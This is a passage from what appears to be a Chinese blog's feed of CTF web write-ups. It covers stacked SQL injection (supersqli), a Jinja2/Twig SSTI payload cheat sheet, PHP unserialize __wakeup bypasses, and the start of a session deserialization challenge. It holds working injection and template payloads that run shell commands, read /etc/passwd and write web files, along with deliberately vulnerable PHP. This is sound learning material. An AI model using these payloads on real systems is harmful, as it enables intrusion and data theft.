class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile(<span class="variable">$path</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="攻防世界-supersqli"><a href="#攻防世界-supersqli" class="headerlink" title="攻防世界-supersqli"></a>攻防世界-supersqli</h2><p>打开是sql注入，但是过滤了好多东西 /select|update|delete|drop|insrt|where|./i</p>
<p>网上搜了搜开始尝试着绕过，但是尝试了好几种绕过方法都不行，看了一下wp，知道是要采用堆叠注入，第一次知道，网上开搜。</p>
<p>1.查数据库</p>
<p>-1’;show databases;#</p>
<p>但是不明白，感觉查这个库没啥子作用</p>
<p>2.查表</p>
<p>-1’;show tables;#</p>
<p><img src="sql.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX2hlbGxvd29yZA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
<p>出现了两个表单，都查询看一下嘛</p>
<p>3.查列表</p>
<p>（1）-1‘;show columns from <code>1919810931114514</code>;#</p>
<p>​    字符串为表名时进行操作时要加反引号``这两个标记符号，弄了我好长时间，没注意到反引号这玩意，错把单引号当反引号</p>
<p><img src="sql.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX2hlbGxvd29yZA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述">    flag ,NO字段</p>
<p>（2）-1’;show columns from <code>words</code>;#</p>
<p><img src="sql.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX2hlbGxvd29yZA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
<p>id,NO等字段</p>
<p>因为这里是字段，而不是列名，不能直接进行查询。而且通过观察int()发现，写入到的内容存到了id中，推测查询的是words表中的内容，即输入的内容都会在words这个表中进行查询，但是flag不在这个表中</p>
<p>4.<strong>查询字段内容</strong></p>
<p>有两种方法</p>
<p>1.改表名</p>
<p>根据在words表里发现id字段与查询框里的出的数据类型相同，一个数字，一个字符串，所以猜测默认查询的就是words表，inject（搜索框中）值应该赋给了id<br>利用：我们可以将含有flag字段的表命名为word，然后修改字段名字，不就查询到我们想要的结果！（前提是这里rename，alert关键字 没有做过滤）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50); #</span><br></pre></td></tr></table></figure>

<p>查看flag</p>
<p>1’ or 1=1#</p>
<p>2.预编译来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;sEt @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prEpare stmt from @sql;EXECUTE stmt;#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>‘;sEt @sql = CONCAT(‘se’,‘lect * from <code>1919810931114514</code>;’); 进行预编译<br>prEpare stmt from @sql; 设置变量<br>EXECUTE stmt;# 执行</p>
<p>对预编译不是很了解，了解之后再做补充吧！！</p>
<p>最后，不愧是强网杯的题，真是难呀</p>
<p>参考文章：[(40条消息) 攻防世界-supersqli详解_Mr_helloword的博客-CSDN博客](</p>
]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2021/12/14/ssti/</url>
    <content><![CDATA[<h1 id="SSTI-模板注入漏洞"><a href="#SSTI-模板注入漏洞" class="headerlink" title="SSTI 模板注入漏洞"></a>SSTI 模板注入漏洞</h1><p>文件包含：是通过python的对象的继承来一步步实现文件读取和命令执行的的。<br>思路：找到父类&lt;type ‘object’&gt;–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。</p>
<p>1.获取基类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2]</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line">request.__class__.__mro__[8] 　　//针对jinjia2/flask为[9]适用</span><br><span class="line">或者</span><br><span class="line">[].__class__.__bases__[0]       //其他的类似</span><br></pre></td></tr></table></figure>

<p>2.获取本类的子类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>

<p>3.找到可利用的方法</p>
<p>&lt;type ‘file’&gt;等    &lt;class ‘site._Printer’&gt;类型（可以进行命令执行）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>找到目标文件，接着读取文件</p>
<p>4.读写文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有四种方法，具体详情参考第二篇文章</p>
<p>参考文章：</p>
<p><a href="https://www.cnblogs.com/cioi/p/12308518.html#a5">从零开始的ssti学习（已填） - Cxlover - 博客园 (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/Onlyone_1314/article/details/121569766">(40条消息) XCTF-攻防世界CTF平台-Web类——12、Web_python_template_injection（SSTI服务器模板注入、Flask框架之Jinja2模板渲染引擎）_Onlyone_1314的博客-CSDN博客</a></p>
<h1 id="Simple-SSTI-2-bugku"><a href="#Simple-SSTI-2-bugku" class="headerlink" title="Simple_SSTI_2  bugku"></a>Simple_SSTI_2  bugku</h1><p>第二次做这种题，感觉还是不会做，跟着wp做的</p>
<p>1.查看上一级所存在的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?flag=&#123;&#123;config.__class__.init__.globals__[&#x27;os&#x27;].popen(&#x27;ls ../&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>2.查看文件夹中有哪些文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?flag=&#123;&#123;config.__class__.init__.globals__[&#x27;os&#x27;].popen(&#x27;ls /app&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>3.查看文件内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?flag=&#123;&#123;config.__class__.init__.globals__[&#x27;os&#x27;].popen(&#x27;cat /app/flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>有些不理解，先当作常用命令记着吧！！</p>
<h1 id="PAYLOAD"><a href="#PAYLOAD" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h1><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=1231&#123;&#123;2*4&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>判断是不是ssti</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=&#123;&#123;system(&#x27;ls&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>执行命令，但不能成功，，好像是空格不可以</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是最后的payload</p>
<p><a href="https://0day.work/jinja2-template-injection-filter-bypasses/">https://0day.work/jinja2-template-injection-filter-bypasses/</a></p>
<p>bypass</p>
<p>攻防世界的题Web_python_template_injection</p>
<p>jinjia的语言：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">控制结构 &#123;% %&#125;</span><br><span class="line">变量取值 &#123;&#123; &#125;&#125;</span><br><span class="line">注释 &#123;# #&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p> ：查看所有的模块</p>
<p>os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置，为第59个</p>
<p>利用到的是<strong>func_globals.keys()</strong> ：查看全局函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27; )</span><br></pre></td></tr></table></figure>

<p>查看flag文件所在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;fl4g&quot;).read()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>读取文件 利用到的是object对象下的file类的read函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://xuanxuanblingbling.github.io/ctf/web/2019/01/02/[python](https://so.csdn.net/so/search?q=python&amp;spm=1001.2101.3001.7020)/">https://xuanxuanblingbling.github.io/ctf/web/2019/01/02/[python](https://so.csdn.net/so/search?q=python&amp;spm=1001.2101.3001.7020)/</a></p>
<p>基础类的执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__  返回类型所属的对象（类）</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>常见的基础调用类函数执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__subclasses__()</span><br><span class="line"># 返回子类的列表 [,,,...]</span><br><span class="line">#从中随便选一个类,查看它的__init__</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__subclasses__()[30].__init__</span><br><span class="line">&lt;slot wrapper &#x27;__init__&#x27; of &#x27;object&#x27; objects&gt;</span><br><span class="line"># wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性</span><br><span class="line">#再换几个子类，很快就能找到一个重载过__init__的类，比如</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__subclasses__()[5].__init__</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__subclasses__()[5].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]</span><br><span class="line">#然后用eval执行命令即可</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="1-获取基类"><a href="#1-获取基类" class="headerlink" title="1.获取基类"></a>1.获取基类</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//获取基本类</span><br><span class="line">```bash</span><br><span class="line">&#x27;&#123;&#123;[].__class__&#125;&#125;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>获取所有类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>获取config对象与request对象类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#123;&#123;url_for.__globals__&#125;&#125;&#x27;</span><br><span class="line">&#x27;&#123;&#123;config&#125;&#125;#即查看权限&#x27;</span><br><span class="line">&#x27;&#123;&#123; config.SQLALCHEMY_DATABASE_URI &#125;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>python</p>
<p>读取文件类，&lt;type ‘file’&gt; file位置一般为40，直接调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[40](&#x27;fl4g&#x27;).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&lt;class ‘site._Printer’&gt; 调用os的popen执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果system被过滤，用os的listdir读取目录+file模块读取文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&lt;class ‘subprocess.Popen’&gt; 位置一般为258</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[258](&#x27;ls&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;&#x27;</span><br><span class="line">&#x27;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[258](&#x27;ls /flasklight&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;&#x27;</span><br><span class="line">&#x27;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[258](&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&lt;class ‘warnings.catch_warnings’&gt;<br>一般位置为59，可以用它来调用file、os、eval、commands等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#调用file</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&#x27;/etc/passwd&#x27;).read()      #把 read() 改为 write() 就是写文件</span><br><span class="line">#读文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](r&#x27;C:\1.php&#x27;).read()</span><br><span class="line">object.__subclasses__()[40](r&#x27;C:\1.php&#x27;).read()</span><br><span class="line">#写文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;).write(&#x27;123&#x27;)</span><br><span class="line">object.__subclasses__()[40](&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;).write(&#x27;123&#x27;)</span><br><span class="line"></span><br><span class="line">#调用eval</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)</span><br><span class="line">#调用system方法</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.values()[12].__dict__.values()[144](&#x27;whoami&#x27;)</span><br><span class="line">root</span><br><span class="line">0</span><br><span class="line">#调用commands进行命令执行</span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;commands&#x27;).getstatusoutput(&#x27;ls&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>python3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#读取文件与写文件类</span><br><span class="line">&#x27;&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()&#125;&#125;&#x27;</span><br><span class="line">#执行命令</span><br><span class="line">&#x27;&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)&#125;&#125;&#x27;</span><br><span class="line">#命令执行：</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">#文件操作</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="payload大全"><a href="#payload大全" class="headerlink" title="payload大全"></a>payload大全</h2><p>及绕过payload大全_HoAd’blog-CSDN博客](<a href="https://blog.csdn.net/weixin_54515836/article/details/113778233">https://blog.csdn.net/weixin_54515836/article/details/113778233</a>)</p>
<p><img src="sql.assets/1596031074.jpg!small" alt="img"></p>
<h1 id="SMARTY"><a href="#SMARTY" class="headerlink" title="SMARTY"></a>SMARTY</h1><p><a href="https://www.freebuf.com/column/219913.html">Smarty SSTI - FreeBuf网络安全行业门户</a></p>
<h2 id="cat、tac、nl三者的区别："><a href="#cat、tac、nl三者的区别：" class="headerlink" title="cat、tac、nl三者的区别："></a>cat、tac、nl三者的区别：</h2><p>cat读取文件的内容，将文件的内容按正常的顺序打出，而tac与cat恰恰相反，它也可以对文件进行读取只不过是按逆序打出文件内容，至于nl，它是在打出文件内容的同时给每行加了行号。</p>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>unserialize</title>
    <url>/2021/12/26/unserialize/</url>
    <content><![CDATA[<h1 id="UNSERIALIZE"><a href="#UNSERIALIZE" class="headerlink" title="UNSERIALIZE"></a>UNSERIALIZE</h1><p>Web_php_unserialize  攻防世界</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;           <span class="comment">//定义一个类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;			<span class="comment">//变量属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;      <span class="comment">//类方法</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; 		<span class="comment">//wakeup函数 返回index.php所以必须绕过次函数</span></span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php     //flag所在文件</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123;        		 <span class="comment">//判断是否传入参数</span></span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]);  	<span class="comment">//对传入参数进行base64加密</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; <span class="comment">//正则检查</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>);      <span class="comment">//进行反序列化</span></span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); 	<span class="comment">//返回想要结果</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.Demo  中file为变量，可以将fl4g.php作为变量传进去</p>
<p>2.function __wakeup() {<br>    if ($this-&gt;file != ‘index.php’)</p>
<p>强行要求输入的变量为index.php 考虑绕过</p>
<p>3.(preg_match(‘/[oc]:\d+:/i’</p>
<p>正则匹配，过滤掉以o/c:int   \d  是整数   /i区分大小写</p>
<p>在文中过滤掉的是序列化后得到的O:4  ,改为O:+4即可过滤</p>
<p>4.$var = base64_decode($_GET[‘var’]);</p>
<p>输入的结果要base64加密</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;           <span class="comment">//定义一个类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;			<span class="comment">//变量属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;      <span class="comment">//类方法</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; 		<span class="comment">//wakeup函数 返回index.php所以必须绕过次函数</span></span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php     //flag所在文件</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$A</span>=<span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line"><span class="variable">$C</span>=serialize(<span class="string">&#x27;$A&#x27;</span>);</span><br><span class="line"><span class="variable">$C</span>=str_replace(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$C</span>);</span><br><span class="line"><span class="variable">$C</span>=str_replace(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$C</span>);</span><br><span class="line">var_dump(<span class="variable">$C</span>);</span><br><span class="line">var_dump(base64_decode(<span class="variable">$C</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</p>
<h1 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过最后一个if语句可以达到目的</p>
